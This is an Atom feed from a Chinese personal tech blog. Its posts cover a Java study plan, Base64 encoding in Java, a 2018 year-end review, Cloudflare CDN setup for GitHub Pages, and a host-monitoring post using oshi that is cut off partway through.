<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>耒耒耒耒耒</title>
  
  <subtitle>张未的技术博客</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://blog.weechang.xyz/"/>
  <updated>2019-09-04T09:21:59.235Z</updated>
  <id>https://blog.weechang.xyz/</id>
  
  <author>
    <name>张未</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>学习计划记录</title>
    <link href="https://blog.weechang.xyz/2019/09/04/study-plan-main/"/>
    <id>https://blog.weechang.xyz/2019/09/04/study-plan-main/</id>
    <published>2019-09-04T09:12:18.000Z</published>
    <updated>2019-09-04T09:21:59.235Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>一篇简单的学习计划记录档案。</p></blockquote><a id="more"></a><p>算一算从15年4月开始工作至今，已经有四年多。从大学到现在一直都是浑浑噩噩地在写代码。虽然也折腾了不少东西，但是远不是我想要的。于是制定了以为为期五个月的晋级计划，期待自己能够在明年工作满五年之际有一个好的交代。特此记录！</p><p>具体计划如下</p><ul><li><strong>2019/09/04~2019/09/10</strong> 数据结构</li><li><strong>2019/09/11~2019/09/17</strong> 算法</li><li><strong>2019/09/18~2019/09/24</strong> 计算机原理</li><li><strong>2019/09/25~2019/10/01</strong> Linux</li><li><strong>2019/10/02~2019/10/08</strong> 计算机网络</li><li><strong>2019/10/09~2019/10/15</strong> Netty、IO、Nginx</li><li><strong>2019/10/16~2019/10/22</strong> Java基础</li><li><strong>2019/10/23~2019/10/29</strong> Java并发</li><li><strong>2019/10/30~2019/11/05</strong> Java多线程</li><li><strong>2019/11/06~2019/11/12</strong> Spring</li><li><strong>2019/11/13~2019/11/19</strong> Sql</li><li><strong>2019/11/20~2019/11/26</strong> NoSql</li><li><strong>2019/11/27~2019/12/03</strong> MQ（Kafka、RocketMQ）</li><li><strong>2019/12/04~2019/12/10</strong> 分布式</li><li><strong>2019/12/11~2019/12/17</strong> Dubbo生态</li><li><strong>2019/12/18~2019/12/24</strong> Spring Cloud</li><li><strong>2019/12/25~2019/12/31</strong> JVM</li><li><strong>2020/01/01~2020/01/07</strong> 设计模式</li><li><strong>2020/01/08~2020/01/14</strong> 经验整理</li><li><strong>2020/01/15~2020/01/21</strong> 项目难点整理</li><li><strong>2020/01/22~2020/01/28</strong> 亮点巩固</li></ul><p>以上只是一个大致的学习计划，基于自己已有基础进行进一步的加深与巩固。不具有普遍参考意义，主要以深入理论为主，刷面试题为辅。计划每天早上六点起床，六点半至八点学习。晚上花一个小时时间分析、整理、记录学习成果。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;p&gt;一篇简单的学习计划记录档案。&lt;/p&gt;&lt;/blockquote&gt;
    
    </summary>
    
      <category term="晋级之路" scheme="https://blog.weechang.xyz/categories/%E6%99%8B%E7%BA%A7%E4%B9%8B%E8%B7%AF/"/>
    
    
      <category term="Java，学习计划" scheme="https://blog.weechang.xyz/tags/Java%EF%BC%8C%E5%AD%A6%E4%B9%A0%E8%AE%A1%E5%88%92/"/>
    
  </entry>
  
  <entry>
    <title>Base64在Java中的应用</title>
    <link href="https://blog.weechang.xyz/2019/04/25/base64InJava/"/>
    <id>https://blog.weechang.xyz/2019/04/25/base64InJava/</id>
    <published>2019-04-25T03:28:14.000Z</published>
    <updated>2019-04-25T05:25:45.201Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>Base64是一种能将任意Binary资料用64种字元组合成字串的方法，而这个Binary资料和字串资料彼此之间是可以互相转换的，十分方便。在实际应用上，Base64除了能将Binary资料可视化之外，也常用来表示字串加密过后的内容。</p></blockquote><a id="more"></a><p>最近做到一个项目，请求是支付宝的H5付款地址，完整URL类似于</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="comment">//abc.com/?payUrl=https://open.alipay.com/gateway.do?sing=xxxxx&amp;bizContent=&#123;"appId":"2018xxxx","subject":"苹果X"&#125;</span></span><br></pre></td></tr></table></figure><p>这个时候，通过 request.getParameter(“payUrl”); 方法获取参数就会有问题。应该说是直接访问接口400。第一直觉是因为参数是URL导致的。于是便想要通过将参数编码后再参数，刚开始想的是使用URL编码，接口400的情况不存在了，但是解码后会有问题，因为还会被浏览器二次URL编码。</p><p>针对二次URL编码的情况，想的是二次解码就行了，试了下貌似不行。后来开始换方案，直接换成Base64编码传参。</p><p>在Java中Base64方案有以下种</p><h2 id="JAVA8-之前的方法"><a href="#JAVA8-之前的方法" class="headerlink" title="JAVA8 之前的方法"></a>JAVA8 之前的方法</h2><p>在低于Java8的版本中做Base64的编码与解码，可以使用JDK里sun.misc下的BASE64Encoder和BASE64Decoder这两个类，具体用法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> BASE64Encoder encoder = <span class="keyword">new</span> BASE64Encoder();</span><br><span class="line"><span class="keyword">final</span> BASE64Decoder decoder = newBASE64Decoder();</span><br><span class="line"><span class="keyword">final</span> String text =<span class="string">"weechang耒耒耒耒耒"</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">byte</span>[] textByte = text.getBytes(<span class="string">"UTF-8"</span>);</span><br><span class="line"><span class="comment">//编码</span></span><br><span class="line"><span class="keyword">final</span> String encodedText = encoder.encode(textByte);</span><br><span class="line">System.out.println(encodedText);</span><br><span class="line"><span class="comment">//解码</span></span><br><span class="line">System.out.println(<span class="keyword">new</span> String(decoder.decodeBuffer(encodedText),<span class="string">"UTF-8"</span>));</span><br><span class="line"><span class="keyword">final</span> BASE64Encoder encoder = <span class="keyword">new</span> BASE64Encoder();</span><br><span class="line"><span class="keyword">final</span> BASE64Decoder decoder = <span class="keyword">new</span> BASE64Decoder();</span><br><span class="line"><span class="keyword">final</span> String text =<span class="string">"weechang耒耒耒耒耒"</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">byte</span>[] textByte = text.getBytes(<span class="string">"UTF-8"</span>);</span><br><span class="line"><span class="comment">//编码</span></span><br><span class="line"><span class="keyword">final</span> String encodedText =encoder.encode(textByte);</span><br><span class="line">System.out.println(encodedText);</span><br><span class="line"><span class="comment">//解码</span></span><br><span class="line">System.out.println(<span class="keyword">new</span> String(decoder.decodeBuffer(encodedText),<span class="string">"UTF-8"</span>));</span><br></pre></td></tr></table></figure><p>只是这个sun.misc所提供的Base64功能，编码和解码的效率并不太好，而且在以后的Java版本可能就不被支持了，不是很建议使用。</p><h2 id="Apache-Commons-Codec-方法"><a href="#Apache-Commons-Codec-方法" class="headerlink" title="Apache Commons Codec 方法"></a>Apache Commons Codec 方法</h2><p>Apache Commons Codec有提供Base64的编码与解码功能，使用org.apache.commons.codec.binary下的Base64类具体用法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Base64 base64 = <span class="keyword">new</span> Base64();</span><br><span class="line"><span class="keyword">final</span> String text = <span class="string">"weechang耒耒耒耒耒"</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">byte</span>[] textByte = text.getBytes(<span class="string">"UTF-8"</span>);</span><br><span class="line"><span class="comment">//编码</span></span><br><span class="line"><span class="keyword">final</span> String encodedText = base64.encodeToString(textByte);System.out.println(encodedText);</span><br><span class="line"><span class="comment">//解码</span></span><br><span class="line">System.out.println(<span class="keyword">new</span> String(base64.decode(encodedText),<span class="string">"UTF-8"</span>));</span><br><span class="line"><span class="keyword">final</span> Base64 base64 = <span class="keyword">new</span> Base64();</span><br><span class="line"><span class="keyword">final</span> String text = <span class="string">"weechang耒耒耒耒耒"</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">byte</span>[] textByte = text.getBytes(<span class="string">"UTF-8"</span>);</span><br><span class="line"><span class="comment">//编码</span></span><br><span class="line"><span class="keyword">final</span> String encodedText = base64.encodeToString(textByte);System.out.println(encodedText);</span><br><span class="line"><span class="comment">//解码</span></span><br><span class="line">System.out.println(<span class="keyword">new</span> String(base64.decode(encodedText), <span class="string">"UTF-8"</span>));</span><br></pre></td></tr></table></figure><p>以上的代码看起来比用sun.misc还要更精简，效能实际执行起来也快了不少。缺点是需要引用Apache Commons Codec，很麻烦。</p><h3 id="Java8-方法"><a href="#Java8-方法" class="headerlink" title="Java8 方法"></a>Java8 方法</h3><p>Java 8的java.util套件中，新增了Base64的类别，可以用来处理Base64的编码与解码，用法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Base64.Decoder decoder = Base64.getDecoder();</span><br><span class="line"><span class="keyword">final</span> Base64.Encoder encoder = Base64.getEncoder();</span><br><span class="line"><span class="keyword">final</span> String text = <span class="string">"weechang耒耒耒耒耒"</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">byte</span>[] textByte = text.getBytes(<span class="string">"UTF-8"</span>);</span><br><span class="line"><span class="comment">//编码</span></span><br><span class="line"><span class="keyword">final</span> String encodedText = encoder.encodeToString(textByte);</span><br><span class="line">System.out.println(encodedText);</span><br><span class="line"><span class="comment">//解码</span></span><br><span class="line">System.out.println(<span class="keyword">new</span> String(decoder.decode(encodedText), <span class="string">"UTF-8"</span>));</span><br><span class="line">finalBase64.Decoder decoder = Base64.getDecoder();</span><br><span class="line"><span class="keyword">final</span> Base64.Encoder encoder = Base64.getEncoder();</span><br><span class="line"><span class="keyword">final</span> String text = <span class="string">"weechang耒耒耒耒耒"</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">byte</span>[] textByte = text.getBytes(<span class="string">"UTF-8"</span>);</span><br><span class="line"><span class="comment">//编码</span></span><br><span class="line"><span class="keyword">final</span> String encodedText = encoder.encodeToString(textByte);</span><br><span class="line">System.out.println(encodedText);</span><br><span class="line"><span class="comment">//解码</span></span><br><span class="line">System.out.println(<span class="keyword">new</span> String(decoder.decode(encodedText), <span class="string">"UTF-8"</span>));</span><br></pre></td></tr></table></figure><p>与sun.misc和Apache Commons Codec所提供的Base64编解码器来比较的话，Java 8提供的Base64拥有更好的效能。</p><p>但是实测后，发现通过编码后的Base64传到服务端不能进行解码。后来经过字符串比较才发现，编码的Base64和解码的Base64有一部分数据是不一致的。Base64中的“+”到了服务端会被” “替换掉。所以得使用Java8中的另外一种Base64方案。</p><h3 id="Java8-URL-的-Base64"><a href="#Java8-URL-的-Base64" class="headerlink" title="Java8 URL 的 Base64"></a>Java8 URL 的 Base64</h3><p>Java8 针对需要在URL中传输的Base64提供了另外一套解决方法，具体用法如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Base64.Decoder decoder = Base64.getUrlDecoder();</span><br><span class="line"><span class="keyword">final</span> Base64.Encoder encoder = Base64.getUrlEncoder();</span><br><span class="line"><span class="keyword">final</span> String text = <span class="string">"weechang耒耒耒耒耒"</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">byte</span>[] textByte = text.getBytes(<span class="string">"UTF-8"</span>);</span><br><span class="line"><span class="comment">//编码</span></span><br><span class="line"><span class="keyword">final</span> String encodedText = encoder.encodeToString(textByte);</span><br><span class="line">System.out.println(encodedText);</span><br><span class="line"><span class="comment">//解码</span></span><br><span class="line">System.out.println(<span class="keyword">new</span> String(decoder.decode(encodedText), <span class="string">"UTF-8"</span>));</span><br><span class="line">finalBase64.Decoder decoder = Base64.getDecoder();</span><br><span class="line"><span class="keyword">final</span> Base64.Encoder encoder = Base64.getEncoder();</span><br><span class="line"><span class="keyword">final</span> String text = <span class="string">"weechang耒耒耒耒耒"</span>;</span><br><span class="line"><span class="keyword">final</span> <span class="keyword">byte</span>[] textByte = text.getBytes(<span class="string">"UTF-8"</span>);</span><br><span class="line"><span class="comment">//编码</span></span><br><span class="line"><span class="keyword">final</span> String encodedText = encoder.encodeToString(textByte);</span><br><span class="line">System.out.println(encodedText);</span><br><span class="line"><span class="comment">//解码</span></span><br><span class="line">System.out.println(<span class="keyword">new</span> String(decoder.decode(encodedText), <span class="string">"UTF-8"</span>));</span><br></pre></td></tr></table></figure><p>通过以上的方法编码后的Base64字符串在URL传输中，是安全的，去除了会被URL特殊处理的字符。</p><p>至此，绕路一大圈，问题终于得到解决。</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;p&gt;Base64是一种能将任意Binary资料用64种字元组合成字串的方法，而这个Binary资料和字串资料彼此之间是可以互相转换的，十分方便。在实际应用上，Base64除了能将Binary资料可视化之外，也常用来表示字串加密过后的内容。&lt;/p&gt;&lt;/blockquote&gt;
    
    </summary>
    
      <category term="日常记录" scheme="https://blog.weechang.xyz/categories/%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/"/>
    
    
      <category term="日常记录" scheme="https://blog.weechang.xyz/tags/%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/"/>
    
      <category term="Base64" scheme="https://blog.weechang.xyz/tags/Base64/"/>
    
      <category term="编码，Java" scheme="https://blog.weechang.xyz/tags/%E7%BC%96%E7%A0%81%EF%BC%8CJava/"/>
    
  </entry>
  
  <entry>
    <title>2018年终总结</title>
    <link href="https://blog.weechang.xyz/2019/01/21/year-report-of-2018/"/>
    <id>https://blog.weechang.xyz/2019/01/21/year-report-of-2018/</id>
    <published>2019-01-21T10:39:22.000Z</published>
    <updated>2019-01-22T01:18:46.237Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>一直在犹豫要不要写这个年终终结，但是想一想，博客都有了，还是就写吧。<br><a id="more"></a></p></blockquote><p>写是一回事，怎么写，写到什么程度又是另外一回事了。大概还是分方面写吧。</p><h1 id="一、工作方面"><a href="#一、工作方面" class="headerlink" title="一、工作方面"></a>一、工作方面</h1><ul><li><p><strong>换工作</strong>。2018在工作方面最大的事情莫过于换工作了吧，2018年3月份，由于受不了上家公司的代码里的各种坑，终于鼓起勇气换了一份工作。</p><ul><li><p>辞职。辞职其实也是一件值得说的是，因为辞职的时候发生了一点点小意外。就是公司工资扣得不清晰，扣的工资是我在公司所有事假的钱，一直很好奇他怎么不一起扣了。还有就是说好的出差补贴，没有发下来，去找人力问的时候，人力那边态度十分让人气愤。不过这都是过去式了。</p></li><li><p>面试。面试新工作其实也值得写一写，现在这家公司，和另外一家公司给出的薪资差距大概在1K左右，但是通过侧面渠道获得的消息是这家公司实力不错，另外加班相对要少一些，技术也不错。于是选择了这家公司，结果进入公司后才发现事与愿违。但是既然选择了，我就相信自己能够走下去。</p></li></ul></li></ul><p>换工作大概就这么多可说的，其实想想也没啥可说的。</p><ul><li><p><strong>新公司</strong>。新公司各个方面都很好，比如说行业（新零售）。比如说行业内实力（MAU一直霸占行业第一）。比如说人员实力（很大一部分京东挖过来的），比如说经济实力（靠PPT项目就拿了1亿刀融资，然后又拿了4亿刀的B轮）。等等 ，很多，这儿就着重说下公司的缺点吧。</p><ul><li><p>薪资。虽然当时感觉加上补贴只比另外一家少了1K，但是现在来说的话，心里还是一个疙瘩。</p></li><li><p>工作内容。当时面试的时候说的是做商品，库存这方面的东西。但是实际去了做的是工单、陈列这方面的东西。说实话，心里落差还是蛮大的。我一直想要往高并发或基础架构方面发展。这样的工作内容与我心里的预期是有一些差距的。</p></li><li><p>技术实力。当时面试，看到公司的成绩加上HR所说的，理所当然认为公司的技术实力应该还是不错的。结果代码规范就是没有规范。代码看起来乱七八糟的，这点让我很不爽，虽然我的代码整洁度也不够，但是至少做得比这好。</p></li></ul></li></ul><p><strong>总的来说，新工作是利弊相当。没有特别喜欢，也没有特别讨厌，就像那个你看了很多年的自己样。</strong></p><h1 id="二、学习方面"><a href="#二、学习方面" class="headerlink" title="二、学习方面"></a>二、学习方面</h1><p>学习方面，并没有取得长足的进步，一方面是由于自己的懒，另一方面是由于自己的接触面有限。准备2019年上年把自己那几个太监的开源项目更新到1.0版本。2019年下半年继续升级，然后就是学习Java理论知识了，计划先学习Java并发相关知识，然后再学习设计模式。说实话，作为一个快毕业三年了的人，这个学习进度，真的不想吐槽。之前一直没有注重基础学习。</p><h1 id="三、财务方面"><a href="#三、财务方面" class="headerlink" title="三、财务方面"></a>三、财务方面</h1><ul><li><p><strong>开支。</strong> 2018年开始，慢慢有了一点积蓄，然后就慢慢有点膨胀了，办了健身卡，买了健身课，买了相机。这都是一大笔开支。</p></li><li><p><strong>理财。</strong> 2018年8月开始，在朋友的带领下，开始投资股市，然而股市行情并不怎么样，虽说没赔本，但是赚得也不多，投入5W赚了几千块。</p></li></ul><p><strong>准备2019积蓄学习理财，同时不要再大手大脚了，到现在还欠着债的。2018开始的繁华，到最后的萧条。可谓是眼见他起高楼，眼见他塌了楼。</strong></p><h1 id="四、感情方面"><a href="#四、感情方面" class="headerlink" title="四、感情方面"></a>四、感情方面</h1><p>日子一如既往地过着，不出意外，2019我应该会成为她的丈夫了。说实话，我还没准备好。</p><h1 id="五、家庭方面"><a href="#五、家庭方面" class="headerlink" title="五、家庭方面"></a>五、家庭方面</h1><p>对于家庭，我一直是出于愧疚与心安理得的挣扎中。母亲的离婚后对工作的退缩让我对她有些不满，同时她每次生病，我都出于深深的自责中。2018我的日子过得并不宽裕，想要帮她一些，也是有心无力，而且本就是一个无底洞。</p><p><strong>2019希望母亲能够独立一些吧!</strong></p><h1 id="六、健康方面"><a href="#六、健康方面" class="headerlink" title="六、健康方面"></a>六、健康方面</h1><p>甲亢一直未愈，这是我一直介怀的地方。但是终于也学着去健身房了，了解了一些健身最基本的知识。</p><p><strong>2019希望甲亢能治愈，坚持去健身房。</strong></p><h1 id="七、总结"><a href="#七、总结" class="headerlink" title="七、总结"></a>七、总结</h1><p><strong>总的来说2018过得有些糟糕。希望2019能够过得好一些。也祝愿各位同仁，能够有一个美好的2019。此致。</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;p&gt;一直在犹豫要不要写这个年终终结，但是想一想，博客都有了，还是就写吧。&lt;br&gt;
    
    </summary>
    
      <category term="日常记录" scheme="https://blog.weechang.xyz/categories/%E6%97%A5%E5%B8%B8%E8%AE%B0%E5%BD%95/"/>
    
    
  </entry>
  
  <entry>
    <title>使用cloudflare为你的博客加速-突破对百度爬虫的限制</title>
    <link href="https://blog.weechang.xyz/2019/01/21/githubpages-cloudflare-cdn/"/>
    <id>https://blog.weechang.xyz/2019/01/21/githubpages-cloudflare-cdn/</id>
    <published>2019-01-21T07:19:18.000Z</published>
    <updated>2019-01-21T08:23:29.670Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>写博客也有一段时间了，但是一直钟情于github pages，对coding pages 没有啥感觉。但是前段时间 github pages 访问巨慢，再加上github将百度爬虫屏蔽了。就想要解决这个问题。</p></blockquote><a id="more"></a><p>对于访问慢和百度爬虫的问题，看网上好多人都说的用cdn，因为最开始接触的云平台是七牛云，所以想要用七牛云来做CDN。但是看了一下国内的云平台，貌似国内的云平台开通CDN都需要备案。<br>那就备案吧，但是照相，签名这些都不想搞，于是就一直拖着。后来终于下定决心使用备案了。在备案过程中，由于某些特殊原因，好生了解了一番 cloudflare 。于是就决定使用 cloudflare 来做CDN缓存，下面就说一说具体做法及踩过的坑吧。</p><h1 id="一、添加域名"><a href="#一、添加域名" class="headerlink" title="一、添加域名"></a>一、添加域名</h1><p>cloudflare 其实本身是一个DNS服务商，只是在DNS之外提供了一大堆的附加服务。所以得先设置你的域名DNS服务器为 cloudflare 的DNS服务器。首先在 cloudflare 添加域名</p><img src="/2019/01/21/githubpages-cloudflare-cdn/add_site.png" title="添加域名"><h1 id="二、修改DNS服务器"><a href="#二、修改DNS服务器" class="headerlink" title="二、修改DNS服务器"></a>二、修改DNS服务器</h1><p>选中刚才添加的域名，然后选择DNS，</p><img src="/2019/01/21/githubpages-cloudflare-cdn/dns.png" title="DNS"><p>查看为你分派的DNS服务器地址</p><img src="/2019/01/21/githubpages-cloudflare-cdn/dns_name.png" title="DNS服务器"><p>然后打开你的域名注册商，修改你的DNS服务器。我的是阿里云，下面就以阿里云为例进行说明（其他的域名注册商可以参考网上的对应文档）。</p><ul><li>首先打开域名列表</li></ul><img src="/2019/01/21/githubpages-cloudflare-cdn/domains.png" title="域名列表"><ul><li>然后选中你的域名</li></ul><img src="/2019/01/21/githubpages-cloudflare-cdn/domain_select.png" title="域名选中"><ul><li>然后点击修改DNS，将DNS修改为 cloudflare 为你提供的DNS服务器</li></ul><h1 id="三、域名解析"><a href="#三、域名解析" class="headerlink" title="三、域名解析"></a>三、域名解析</h1><p>做完这一切，就可以回到你的 cloudflare 控制台，选中DNS，进行域名解析了。具体的解析细节就不多说了。</p><ul><li>在域名解析的地方，点击云图标 黄色云，代表使用DNS服务+CDN服务，灰色云，表示只是用DNS服务。</li></ul><h1 id="四、策略设置"><a href="#四、策略设置" class="headerlink" title="四、策略设置"></a>四、策略设置</h1><p>完成域名解析后，就可以设置相应的策略了，比如说静态资源压缩、缓存等。</p><h1 id="五、采坑事项"><a href="#五、采坑事项" class="headerlink" title="五、采坑事项"></a>五、采坑事项</h1><ul><li><p>以上的设置策略不会及时生效，需要经过一定的时间，反正我用的时候一般都是5分钟内就生效了，听说新域名会慢一些。</p></li><li><p>关于百度爬虫访问，这个时候我去测试了一下百度爬虫抓取，还是抓取失败，看了一下还是访问的未CDN之前的地址，估计是因为爬虫系统DNS缓存缘故。具体缓存多久，我就没关注了。</p></li><li><p>如果采用CNAME解析模式的话，同时采用DNS+CDN服务，且源站使用了https的话，会出现重定向次数过多的问题。</p></li></ul><p>比如我的解析，就出现了重定向次数过多的问题</p><img src="/2019/01/21/githubpages-cloudflare-cdn/setting.png" title="解析配置"> <img src="/2019/01/21/githubpages-cloudflare-cdn/https.png" title="源站设置"><p>解决这一问题，其实也很简单。选中域名面板下的 crypto 面板，将 ssl选项改为full就行了。</p><img src="/2019/01/21/githubpages-cloudflare-cdn/full.png" title="全站HTTPS"><p>具体的各项参数代表的意思分别为：</p><p>1.Flexible SSL：您的网站访问者和Cloudflare之间有加密连接，但是从Cloudflare到您的服务器没有加密。即半程加密。优点在于：你的网站不需要SSL证书，用户也能实现SSL加密访问。</p><p>2.Full SSL：全程加密，即从你的网站到CDN服务器再到用户，全程都是SSL加密的。优点在于：只要你的服务器有SSL证书（不管是自签名证书还是购买的SSL），就可以实现SSL加密访问。</p><p>3.Full SSL (strict)：全程加密，它与Full SSL的区别在于你的服务器必须是安装了那些已经受信任的SSL证书（即购买的SSL证书），否则无法开启SSL加密访问。</p><p>4.Strict (SSL-Only Origin Pull)：企业模式。自动将所有的Http转化为Https加密访问，要求你的服务器安装了受信任的有效的SSL证书。</p><h1 id="六、完成"><a href="#六、完成" class="headerlink" title="六、完成"></a>六、完成</h1><p>当CDN设置完成后，就可以网速了，虽然服务器在美国，但是访问速度也是杠杠的。祖国大部分地区都绿了。</p><img src="/2019/01/21/githubpages-cloudflare-cdn/test.png" title="网站测速"><p>OK，各位有兴趣的话，可以搞一搞</p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;p&gt;写博客也有一段时间了，但是一直钟情于github pages，对coding pages 没有啥感觉。但是前段时间 github pages 访问巨慢，再加上github将百度爬虫屏蔽了。就想要解决这个问题。&lt;/p&gt;&lt;/blockquote&gt;
    
    </summary>
    
      <category term="开源之路" scheme="https://blog.weechang.xyz/categories/%E5%BC%80%E6%BA%90%E4%B9%8B%E8%B7%AF/"/>
    
    
      <category term="CDN" scheme="https://blog.weechang.xyz/tags/CDN/"/>
    
      <category term="cloudflare" scheme="https://blog.weechang.xyz/tags/cloudflare/"/>
    
  </entry>
  
  <entry>
    <title>Java监控系统——使用oshi获取主机信息</title>
    <link href="https://blog.weechang.xyz/2019/01/03/java-compouter-info-oshi/"/>
    <id>https://blog.weechang.xyz/2019/01/03/java-compouter-info-oshi/</id>
    <published>2019-01-03T05:16:20.000Z</published>
    <updated>2019-01-03T05:33:45.542Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>最近在筹划做一个监控系统。其中就要获取主机信息，其中遇到一些问题。在此做个记录，以便以后查阅。</p></blockquote><a id="more"></a><p>在该监控系统中，想要做到主机的CPU、内存、磁盘、网络、线程、JVM内存、JVM GC 等维度的监控，JVM方面的监控还好说，直接用JMX做就行了，关键是主机信息不好做监控，JDK没有直接的方案获取系统主机信息。在刚开始想到了以下几种方式获取主机维度的信息。</p><h2 id="一、命令行"><a href="#一、命令行" class="headerlink" title="一、命令行"></a>一、命令行</h2><p>刚开始想的是用最常用的命令行获取主机维度的信息，具体做法是针对不同的系统，写不同的命令。比如说Linux系统，使用TOP命令就能获取到CPU、内存等方面的信息。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">top -b -n 1</span><br></pre></td></tr></table></figure><p>执行该TOP命令就能获取到CPU、内存等维度的信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Tasks: 515 total,   1 running, 511 sleeping,   3 stopped,   0 zombie </span><br><span class="line">Cpu(s): 14.5%us,  5.3%sy,  0.0%ni, 77.0%id,  0.8%wa,  0.0%hi,  2.4%si,  0.0%st \n");</span><br><span class="line">Mem:  65779104k total, 62037048k used,  3742056k free,   425804k buffers \n");</span><br><span class="line">Swap:        0k total,        0k used,        0k free, 21948492k cached \n");</span><br></pre></td></tr></table></figure><p>这种方式虽然好，但是我懒啊，不像做系统兼容，于是就开始寻找现有的开源组件。然后找到了一个sigar的东西，貌似这个在业界内应用还挺广的。</p><h2 id="二、sigar"><a href="#二、sigar" class="headerlink" title="二、sigar"></a>二、sigar</h2><p>sigar的api用起来也挺方便的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// CPU数量（单位：个） </span></span><br><span class="line"><span class="keyword">int</span> cpuLength = sigar.getCpuInfoList().length; </span><br><span class="line">print(cpuLength); </span><br><span class="line">   </span><br><span class="line"><span class="comment">// CPU的总量（单位：HZ）及CPU的相关信息 </span></span><br><span class="line">CpuInfo infos[] = sigar.getCpuInfoList(); </span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; infos.length; i++) &#123;<span class="comment">// 不管是单块CPU还是多CPU都适用 </span></span><br><span class="line">    CpuInfo info = infos[i]; </span><br><span class="line">    print(<span class="string">"mhz="</span> + info.getMhz());<span class="comment">// CPU的总量MHz </span></span><br><span class="line">    print(<span class="string">"vendor="</span> + info.getVendor());<span class="comment">// 获得CPU的卖主，如：Intel </span></span><br><span class="line">    print(<span class="string">"model="</span> + info.getModel());<span class="comment">// 获得CPU的类别，如：Celeron </span></span><br><span class="line">    print(<span class="string">"cache size="</span> + info.getCacheSize());<span class="comment">// 缓冲存储器数量 </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是，sigar需要根据不同的系统下载不同的库文件。</p><blockquote><p>sigar 库文件<br>windows平台:sigar-x86-winnt.dll<br>linux平台:libsigar-x86-linux.so或<br>solaris平台: libsigar-x86-solaris.so或libsigar-sparc-solaris.so或libsigar-sparc64-solaris.so<br>64位平台:分为至强的libsigar-ia64-linux.so和AMD的libsigar-amd64-linux.so,sigar-amd64-winnt.dll</p></blockquote><p>这样就让我很为难了，于是继续在网上寻找。终于找到了oshi。</p><h2 id="三、oshi"><a href="#三、oshi" class="headerlink" title="三、oshi"></a>三、oshi</h2><p>看看oshi是怎么获取系统信息的吧</p><ul><li><p>首先，引入jar包</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span 